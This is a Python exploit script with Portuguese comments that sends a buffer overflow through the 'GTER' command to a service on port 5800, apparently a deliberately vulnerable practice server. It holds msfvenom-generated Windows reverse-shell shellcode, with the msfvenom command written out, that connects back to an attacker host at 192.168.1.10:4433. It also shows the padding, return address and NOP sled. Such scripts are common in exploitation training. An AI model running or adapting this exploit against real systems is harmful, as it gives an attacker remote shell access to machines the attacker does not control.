#!/usr/bin/python
import socket

# badchars = "\x00"

# este shellcode se conecta ao ip 192.168.1.10 na porta 4433 da maquina do invasor (reverse shell)
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.10 lport=4433 exitfunc=thread -b "\x00" -f c

shellcode = ("\xb8\xdc\x99\x1c\xa0\xd9\xc7\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\x99\x97\xfe\x55\xdd"
"\x40\x7c\x95\x1d\x91\xe1\x1f\xf8\xa0\x21\x7b\x89\x93\x91"
"\x0f\xdf\x1f\x59\x5d\xcb\x94\x2f\x4a\xfc\x1d\x85\xac\x33"
"\x9d\xb6\x8d\x52\x1d\xc5\xc1\xb4\x1c\x06\x14\xb5\x59\x7b"
"\xd5\xe7\x32\xf7\x48\x17\x36\x4d\x51\x9c\x04\x43\xd1\x41"
"\xdc\x62\xf0\xd4\x56\x3d\xd2\xd7\xbb\x35\x5b\xcf\xd8\x70"
"\x15\x64\x2a\x0e\xa4\xac\x62\xef\x0b\x91\x4a\x02\x55\xd6"
"\x6d\xfd\x20\x2e\x8e\x80\x32\xf5\xec\x5e\xb6\xed\x57\x14"
"\x60\xc9\x66\xf9\xf7\x9a\x65\xb6\x7c\xc4\x69\x49\x50\x7f"
"\x95\xc2\x57\xaf\x1f\x90\x73\x6b\x7b\x42\x1d\x2a\x21\x25"
"\x22\x2c\x8a\x9a\x86\x27\x27\xce\xba\x6a\x20\x23\xf7\x94"
"\xb0\x2b\x80\xe7\x82\xf4\x3a\x6f\xaf\x7d\xe5\x68\xd0\x57"
"\x51\xe6\x2f\x58\xa2\x2f\xf4\x0c\xf2\x47\xdd\x2c\x99\x97"
"\xe2\xf8\x0e\xc7\x4c\x53\xef\xb7\x2c\x03\x87\xdd\xa2\x7c"
"\xb7\xde\x68\x15\x52\x25\xfb\xda\x0b\x24\xf1\xb2\x49\x26"
"\x14\x12\xc7\xc0\x7c\x84\x81\x5b\xe9\x3d\x88\x17\x88\xc2"
"\x06\x52\x8a\x49\xa5\xa3\x45\xba\xc0\xb7\x32\x4a\x9f\xe5"
"\x95\x55\x35\x81\x7a\xc7\xd2\x51\xf4\xf4\x4c\x06\x51\xca"
"\x84\xc2\x4f\x75\x3f\xf0\x8d\xe3\x78\xb0\x49\xd0\x87\x39"
"\x1f\x6c\xac\x29\xd9\x6d\xe8\x1d\xb5\x3b\xa6\xcb\x73\x92"
"\x08\xa5\x2d\x49\xc3\x21\xab\xa1\xd4\x37\xb4\xef\xa2\xd7"
"\x05\x46\xf3\xe8\xaa\x0e\xf3\x91\xd6\xae\xfc\x48\x53\xce"
"\x1e\x58\xae\x67\x87\x09\x13\xea\x38\xe4\x50\x13\xbb\x0c"
"\x29\xe0\xa3\x65\x2c\xac\x63\x96\x5c\xbd\x01\x98\xf3\xbe"
"\x03")

dados = "A" * 147 + "\xf0\x12\x50\x62" + "\x90" * 32 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.20",5800))
s.recv(1024)
s.send("GTER "+dados+"\r\n")